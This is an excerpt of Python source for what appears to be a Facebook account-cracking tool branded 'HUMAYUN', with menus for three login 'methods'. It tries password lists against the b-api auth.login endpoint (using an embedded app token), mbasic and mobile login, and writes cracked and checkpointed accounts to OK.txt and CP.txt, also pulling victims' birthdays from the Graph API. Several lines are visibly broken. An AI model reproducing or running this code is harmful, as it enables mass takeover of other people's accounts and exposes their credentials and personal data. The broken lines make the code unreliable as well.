...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#MR_HUMAYUN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = HUMAYUN(self.apk).read().splitlines()
			MR_HUMAYUN(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							MR_HUMAYUN('[•] Result CP saved to CP.txt')
							MR_HUMAYUN('\n\tCrack Processing...\n')
							MR_HUMAYUN('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					MR_HUMAYUN('\n01.) Metode b-api ')
					MR_HUMAYUN('02.) Metode mbasic ')
					MR_HUMAYUN('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			MR_HUMAYUN('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			MR_HUMAYUN(' [1] HUMAYUN Method 1 ')
			MR_HUMAYUN(' [2] HUMAYUN Method 2  [ Pro ]')
			MR_HUMAYUN(' [3] HUMAYUN Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [HUMAYUN] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = HUMAYUN('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_HUMAYUN("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				MR_HUMAYUN('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = HUMAYUN('login.txt').read()
					cp_ttl = Prof_HUMAYUN('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					MR_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				MR_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				MR_HUMAYUN('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = HUMAYUN('token.txt').read()
					cp_ttl = Prof_HUMAYUN('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].MR_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				MR_HUMAYUN('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033_     __ _  ___    _  ___  _   _  _   _ _   _ __  __    _ __   ___   _ _   _ 
| | | | | | |  \/  |  / \\ \ / | | | | \ | |
| |_| | | | | |\/| | / _ \\ V /| | | |  \| |
|  _  | |_| | |  | |/ ___ \| | | |_| | |\  |
...
def dupcutter():
	os.system("xdg-open https://wa.me/01880480527")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
